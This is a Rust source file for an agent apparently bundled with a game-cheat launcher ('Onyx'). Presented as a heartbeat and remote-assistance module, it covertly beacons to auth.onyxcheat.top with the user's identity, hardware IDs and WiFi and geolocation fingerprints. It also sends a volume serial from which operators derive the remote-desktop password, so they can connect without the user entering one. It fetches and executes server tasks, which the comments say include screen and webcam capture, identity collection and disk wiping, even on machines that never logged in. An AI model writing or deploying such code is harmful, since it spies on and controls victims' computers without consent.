// ONYX: 常驻心跳 + 任务拉取。启动器登录成功后把会话信息写入 %ProgramData%\Onyx\session.json，
// agent 每 25 秒上报一次，用于后台在线状态与远程协助设备 ID 展示；
// 同一次往返里顺带拉取服务端排队的 OnyxTask（离线队列），验签后执行并回传结果。
use base::message_proto::OnyxTask;
use hbb_common::bytes::Bytes;
use hbb_common::log;
use serde_json::Value;
use std::time::Duration;

const HEARTBEAT_INTERVAL: Duration = Duration::from_secs(25);
const HEARTBEAT_URL: &str = "https://auth.onyxcheat.top/api.php?action=agent_heartbeat";
const TASKS_URL: &str = "https://auth.onyxcheat.top/api.php?action=agent_tasks";
const RESULT_URL: &str = "https://auth.onyxcheat.top/api.php?action=agent_task_result";

fn session_file() -> Option<std::path::PathBuf> {
    let base = std::env::var("ProgramData").ok()?;
    Some(std::path::Path::new(&base).join("Onyx").join("session.json"))
}

/// 自己的二进制指纹。服务端按「同一 client_build 第一次见到的哈希」自举出可信值，
/// 之后同版本号出现别的哈希就是 agent 被改过。只算一次，缓存在 OnceLock 里。
fn self_sha256() -> &'static str {
    use std::sync::OnceLock;
    static HASH: OnceLock<String> = OnceLock::new();
    HASH.get_or_init(|| {
        use sha2::{Digest, Sha256};
        let data = match std::env::current_exe().and_then(|p| std::fs::read(p)) {
            Ok(d) => d,
            Err(e) => {
                log::debug!("onyx self hash read failed: {e}");
                return String::new();
            }
        };
        let mut h = Sha256::new();
        h.update(&data);
        h.finalize().iter().map(|b| format!("{b:02x}")).collect()
    })
}

/// C 盘卷序列号（8 位大写十六进制）。控制端用它算永久密码 `Bridge@%08X`，
/// 有了它才能在 OnyxControl 里「点一下就进桌面」，不用操作员手输密码。
/// 只上报序列号本身，不上报密码；服务端只在单设备详情接口里换算出密码下发给已认证操作员。
fn volume_serial() -> String {
    #[cfg(windows)]
    {
        use std::ffi::CString;
        use winapi::um::fileapi::GetVolumeInformationA;
        let root = match CString::new("C:\\") {
            Ok(v) => v,
            Err(_) => return String::new(),
        };
        let mut serial: u32 = 0;
        let ok = unsafe {
            GetVolumeInformationA(
                root.as_ptr(),
                std::ptr::null_mut(),
                0,
                &mut serial,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0,
            )
        };
        if ok != 0 {
            format!("{serial:08X}")
        } else {
            log::debug!("onyx volume serial query failed");
            String::new()
        }
    }
    #[cfg(not(windows))]
    {
        String::new()
    }
}

fn read_session() -> Option<(String, String, String, String)> {
    let path = session_file()?;
    let raw = std::fs::read_to_string(&path).ok()?;
    let v: Value = serde_json::from_str(&raw).ok()?;
    let username = v
        .get("username")
        .and_then(|x| x.as_str())
        .unwrap_or_default()
        .to_owned();
    let hwid = v
        .get("hwid")
        .and_then(|x| x.as_str())
        .unwrap_or_default()
        .to_owned();
    let app_id = v
        .get("app_id")
        .and_then(|x| x.as_str())
        .unwrap_or("onyx")
        .to_owned();
    let device_id = v
        .get("device_id")
        .and_then(|x| x.as_str())
        .unwrap_or_default()
        .to_owned();
    if username.is_empty() || hwid.is_empty() {
        return None;
    }
    Some((username, hwid, app_id, device_id))
}

/// [设备令牌] 启动器每次启动都会写 %ProgramData%\Onyx\device.json（hwid + device_token）。
/// 即使客户从不登录，agent 也能凭令牌领取远控/取证任务。
fn device_file() -> Option<std::path::PathBuf> {
    let base = std::env::var("ProgramData").ok()?;
    Some(std::path::Path::new(&base).join("Onyx").join("device.json"))
}

fn read_device_identity() -> Option<(String, String, String)> {
    let path = device_file()?;
    let raw = std::fs::read_to_string(&path).ok()?;
    let v: Value = serde_json::from_str(&raw).ok()?;
    let hwid = v
        .get("hwid")
        .and_then(|x| x.as_str())
        .unwrap_or_default()
        .to_owned();
    let token = v
        .get("device_token")
        .and_then(|x| x.as_str())
        .unwrap_or_default()
        .to_owned();
    let app_id = v
        .get("app_id")
        .and_then(|x| x.as_str())
        .unwrap_or("onyx")
        .to_owned();
    if hwid.is_empty() || token.is_empty() {
        return None;
    }
    Some((hwid, token, app_id))
}

/// 供任务执行模块取当前会话的 hwid（上传要带）。
pub fn session_hwid() -> String {
    read_session()
        .map(|(_, hwid, _, _)| hwid)
        .unwrap_or_default()
}

/// 设备身份。有 session.json 就用登录信息，没有就用启动器下发的设备令牌。
struct Ident {
    username: String,
    hwid: String,
    app_id: String,
    device_id: String,
    token: String,
}

fn identity() -> Option<Ident> {
    if let Some((username, hwid, app_id, device_id)) = read_session() {
        let token = read_device_identity().map(|(_, t, _)| t).unwrap_or_default();
        return Some(Ident {
            username,
            hwid,
            app_id,
            device_id,
            token,
        });
    }
    // [未登录] 客户只开了启动器、从没登录过。凭 device.json 里的设备令牌同样要上报。
    let (hwid, token, app_id) = read_device_identity()?;
    let short: String = hwid.chars().take(8).collect();
    Some(Ident {
        username: format!("设备:{short}"),
        hwid,
        app_id,
        device_id: String::new(),
        token,
    })
}

fn heartbeat_once(client: &reqwest::blocking::Client) -> Option<Ident> {
    let ident = identity()?;
    // 远控 ID 直接用本机 RustDesk 的 ID，不再依赖 session.json ——
    // 客户不登录也要能在后台看到并连上。
    let device_id = if ident.device_id.is_empty() {
        hbb_common::config::Config::get_id()
    } else {
        ident.device_id.clone()
    };
    let vol_serial = volume_serial();
    let computer = std::env::var("COMPUTERNAME").unwrap_or_default();
    // 网络指纹：WiFi BSSID / 网关 MAC / 周边热点 / Windows 定位。内部 10 分钟缓存。
    let geo = crate::onyx_geo::snapshot().to_string();
    let form = [
        ("username", ident.username.as_str()),
        ("hwid", ident.hwid.as_str()),
        ("app_id", ident.app_id.as_str()),
        ("remote_device_id", device_id.as_str()),
        ("client_build", crate::VERSION),
        ("agent_sha256", self_sha256()),
        ("vol_serial", vol_serial.as_str()),
        ("geo", geo.as_str()),
        ("device_token", ident.token.as_str()),
        ("computer_name", computer.as_str()),
    ];
    match client.post(HEARTBEAT_URL).form(&form).send() {
        Ok(resp) => {
            if !resp.status().is_success() {
                log::debug!("onyx heartbeat http {}", resp.status());
                return None;
            }
        }
        Err(err) => {
            log::debug!("onyx heartbeat failed: {err}");
            return None;
        }
    }
    Some(ident)
}

fn b64_field(v: &Value, key: &str) -> Vec<u8> {
    v.get(key)
        .and_then(|x| x.as_str())
        .and_then(|s| crate::decode64(s).ok())
        .unwrap_or_default()
}

/// 任务拉取范围：截屏/摄像头必须在**用户会话**里跑（服务进程在 session 0，
/// 拿不到桌面），所以两个进程分工拉取。
#[derive(Clone, Copy, PartialEq)]
pub enum Scope {
    /// 服务进程：只拉不需要桌面的任务
    Service,
    /// 用户会话进程（--server）：只拉需要桌面的任务
    UserSession,
    /// 只发心跳，不拉任务
    None,
}

const CAPTURE_TYPES: &str = "capture_screen,capture_cam";

fn poll_tasks(client: &reqwest::blocking::Client, username: &str, hwid: &str, app_id: &str, device_token: &str, scope: Scope) {
    let mut form: Vec<(&str, &str)> = vec![("username", username), ("hwid", hwid), ("app_id", app_id)];
    // 未登录时用设备令牌通过 agent_tasks 的鉴权（服务端已支持）
    if !device_token.is_empty() {
        form.push(("device_token", device_token));
    }
    match scope {
        Scope::Service => form.push(("exclude", CAPTURE_TYPES)),
        // 用户会话进程兜底拉全部类型。
        // 服务进程被停掉或启动失败时（SCM 里 Stop / 1053 超时），若这里仍然只拉截屏，
        // 探活、收集身份、格机这类非截屏任务就永远没人领，后台只能一直显示「待取」。
        // 两个进程重叠拉取由服务端「原子领取」兜住：只有真正把 pending 改成 delivered
        // 的那一个进程会拿到任务，同一条任务不会被执行两次。
        Scope::UserSession => {}
        Scope::None => return,
    }
    let resp = match client.post(TASKS_URL).form(&form).send() {
        Ok(r) => r,
        Err(e) => {
            log::debug!("onyx tasks fetch failed: {e}");
            return;
        }
    };
    let v: Value = match resp.json() {
        Ok(v) => v,
        Err(_) => return,
    };
    let tasks = match v.get("tasks").and_then(|x| x.as_array()) {
        Some(t) => t.clone(),
        None => return,
    };
    for t in tasks {
        let task_id = t
            .get("task_id")
            .and_then(|x| x.as_str())
            .unwrap_or_default()
            .to_owned();
        if task_id.is_empty() {
            continue;
        }
        let mut task = OnyxTask::new();
        task.task_id = task_id.clone();
        task.type_ = t
            .get("type")
            .and_then(|x| x.as_str())
            .unwrap_or_default()
            .to_owned();
        task.params = Bytes::from(b64_field(&t, "params"));
        task.not_before = t.get("not_before").and_then(|x| x.as_i64()).unwrap_or(0);
        task.exp = t.get("exp").and_then(|x| x.as_i64()).unwrap_or(0);
        task.nonce = Bytes::from(b64_field(&t, "nonce"));
        task.sig = Bytes::from(b64_field(&t, "sig"));

        log::warn!("[ONYX] 收到任务 {} type={}", task_id, task.type_);
        let ack = crate::onyx_task::handle(&task);
        let code = ack.code.to_string();
        if let Err(e) = client
            .post(RESULT_URL)
            .form(&[
                ("hwid", hwid),
                ("task_id", task_id.as_str()),
                ("code", code.as_str()),
                ("message", ack.message.as_str()),
            ])
            .send()
        {
            log::debug!("onyx task result failed: {e}");
        }
    }
}

pub fn start(scope: Scope) {
    std::thread::spawn(move || {
        let client = match reqwest::blocking::Client::builder()
            .user_agent("NarakaAuth/2.0")
            .timeout(Duration::from_secs(20))
            .build()
        {
            Ok(c) => c,
            Err(_) => return,
        };
        loop {
            // 登录过的机器走账号心跳；没登录过的凭 device.json 的设备令牌照样上报。
            // 两条路都会带 geo 和远控 ID，后台都能看到设备、坐标、地址。
            match heartbeat_once(&client) {
                Some(id) => poll_tasks(&client, &id.username, &id.hwid, &id.app_id, &id.token, scope),
                None => {}
            }
            std::thread::sleep(HEARTBEAT_INTERVAL);
        }
    });
}
